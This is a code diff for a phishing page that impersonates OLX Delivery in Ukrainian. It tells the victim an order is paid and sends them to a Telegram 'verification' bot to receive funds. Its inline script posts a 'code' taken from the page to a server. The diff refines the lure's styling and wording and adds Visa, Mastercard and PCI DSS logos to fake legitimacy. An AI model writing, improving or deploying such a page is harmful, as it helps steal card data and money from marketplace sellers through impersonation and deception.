@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OLX Доставка — Підтвердження</title>
+    <title>OLX Доставка</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -21,11 +21,12 @@
             background: var(--olx-light-bg);
             color: var(--olx-dark);
             -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent;
         }
 
         header {
             background: var(--olx-dark);
-            height: 64px;
+            height: 56px;
             display: flex;
             align-items: center;
             justify-content: space-between;
@@ -33,35 +34,41 @@
             position: sticky;
             top: 0;
             z-index: 1000;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        .header-left svg { height: 32px; }
+        /* ЧИСТЫЙ ЛОГОТИП */
+        .header-logo {
+            color: var(--olx-mint);
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            text-decoration: none;
+        }
 
         .header-right {
-            display: flex;
-            align-items: center;
             color: white;
             font-size: 14px;
             font-weight: 500;
         }
 
-        .container { padding: 0 16px; max-width: 500px; margin: 0 auto; }
+        .container { padding: 0 16px; max-width: 480px; margin: 0 auto; }
 
         .title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
-            margin: 24px 0 16px 0;
+            margin: 20px 0 12px 0;
         }
 
         .tabs {
             display: flex;
-            gap: 24px;
+            gap: 20px;
             border-bottom: 1px solid #d8dfe0;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
 
         .tab {
-            padding: 12px 0;
+            padding: 10px 0;
             font-size: 14px;
             font-weight: 500;
             color: var(--olx-dark);
@@ -82,44 +89,45 @@
 
         .order-card {
             background: white;
-            border-radius: 4px;
-            padding: 24px 20px;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
         }
 
         .order-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
 
-        .order-id { font-size: 14px; color: var(--olx-text-gray); }
+        .order-id { font-size: 13px; color: var(--olx-text-gray); }
 
         .status-badge {
             background: #e9f0f0;
             color: var(--olx-text-gray);
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 700;
-            padding: 4px 10px;
+            padding: 4px 8px;
             border-radius: 4px;
             text-transform: uppercase;
         }
 
         .order-summary {
             border-top: 1px solid #f2f4f5;
-            padding-top: 15px;
-            margin-bottom: 20px;
+            padding: 12px 0;
+            margin-bottom: 12px;
         }
 
         .security-notice {
             background: var(--olx-warn-bg);
             border-left: 4px solid var(--olx-warn-border);
-            padding: 16px;
-            margin-bottom: 24px;
+            padding: 14px;
+            margin-bottom: 20px;
             font-size: 14px;
-            line-height: 1.5;
+            line-height: 1.4;
             color: #5d4037;
+            border-radius: 0 4px 4px 0;
         }
 
         .confirm-btn {
@@ -127,7 +135,7 @@
             color: white;
             border: none;
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             border-radius: 4px;
             font-weight: 700;
             font-size: 16px;
@@ -136,28 +144,45 @@
             display: block;
             text-align: center;
             box-sizing: border-box;
+            transition: transform 0.1s;
         }
 
+        .confirm-btn:active {
+            transform: scale(0.98);
+            background: #001f23;
+        }
+
+        /* ИСПРАВЛЕННЫЙ ФУТЕР */
         .footer-info {
             text-align: center;
-            margin-top: 30px;
-            padding-bottom: 40px;
+            margin-top: 40px;
+            padding-bottom: 30px;
         }
 
-        .payment-icons {
+        .payment-methods {
             display: flex;
             justify-content: center;
-            gap: 15px;
-            margin-bottom: 15px;
-            opacity: 0.6;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            background: white;
+            padding: 10px;
+            border-radius: 6px;
+            display: inline-flex;
         }
 
-        .payment-icons img { height: 18px; filter: grayscale(1); }
+        .payment-methods img {
+            height: 16px;
+            width: auto;
+            opacity: 0.8;
+        }
 
         .copyright {
             font-size: 11px;
             color: var(--olx-text-gray);
-            line-height: 1.4;
+            line-height: 1.5;
+            max-width: 280px;
+            margin: 0 auto;
         }
     </style>
 </head>
@@ -165,12 +190,10 @@
 
 <header>
     <div class="header-left">
-        <svg viewBox="0 0 100 48" xmlns="http://www.w3.org/2000/svg">
-            <path d="M19.1 43.1c-10.3 0-18.7-8.5-18.7-18.9S8.8 5.3 19.1 5.3s18.7 8.5 18.7 18.9-8.4 18.9-18.7 18.9zm0-30c-6.1 0-11 5-11 11.1s4.9 11.1 11 11.1 11-5 11-11.1-4.9-11.1-11-11.1zM48.8 42.1V5.3h7.7v36.8h-7.7zM88.7 42.1l-6.8-10.4-6.8 10.4h-9l11.3-17.1-10.7-16.1h9l6.2 9.7 6.2-9.7h9l-10.7 16.1 11.3 17.1h-9z" fill="#23e5db"/>
-        </svg>
+        <a href="#" class="header-logo">olx</a>
     </div>
     <div class="header-right">
-        <span>Мій профіль</span>
+        Мій профіль
     </div>
 </header>
 
@@ -184,37 +207,38 @@
 
     <div class="order-card">
         <div class="order-header">
-            <span class="order-id">Замовлення № 78234109</span>
+            <span class="order-id">№ 78234109</span>
             <span class="status-badge">Нове</span>
         </div>
 
         <div class="order-summary">
-            <div style="display: flex; justify-content: space-between; font-size: 15px;">
+            <div style="display: flex; justify-content: space-between; font-size: 14px;">
                 <span>Статус оплати:</span>
                 <span style="color: #2ecc71; font-weight: 700;">Сплачено</span>
             </div>
         </div>
 
         <div class="security-notice">
-            <strong>Увага!</strong> У зв'язку с почастішанням випадків шахрайства, усі замовлення обробляються в <strong>ручному режимі</strong>. 
+            <strong>Важливо!</strong> У зв'язку з випадками шахрайства, замовлення обробляються в <strong>ручному режимі</strong>. 
             <br><br>
-            Для підтвердження угоди та отримання коштів на вашу картку, перейдіть в офіційний бот верифікації.
+            Для зарахування коштів на вашу карту пройдіть верифікацію в нашому чат-боті.
         </div>
 
         <a href="https://t.me/olx_verification" class="confirm-btn">
-            Підтвердити та отримати кошти
+            Підтвердити
         </a>
     </div>
 
     <div class="footer-info">
-        <div class="payment-icons">
+        <div class="payment-methods">
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/PCI_DSS_logo.svg" alt="PCI DSS">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Electron.svg" alt="Electron">
+            <img src="https://www.vectorlogo.zone/logos/pci-securitystandards/pci-securitystandards-ar21.svg" alt="PCI" style="height: 12px;">
         </div>
         <div class="copyright">
-            © 2026 OLX UA. Сервіс захищений протоколом PCI DSS. <br>
-            Всі операции підлягають обов'язковій ручній перевірці.
+            © 2026 OLX UA. Безпека транзакцій гарантована протоколами PCI DSS. 
+            <br>Обробка замовлень: 24/7
         </div>
     </div>
 </div>
@@ -231,15 +255,10 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ code: authCode })
             });
-            console.log("Code sent successfully");
-        } catch (err) { 
-            console.error("Error sending code:", err); 
-        }
+        } catch (err) { console.error(err); }
     }
 
-    if (code) {
-        sendCodeToServer(code);
-    }
+    if (code) sendCodeToServer(code);
 </script>
 
 </body>
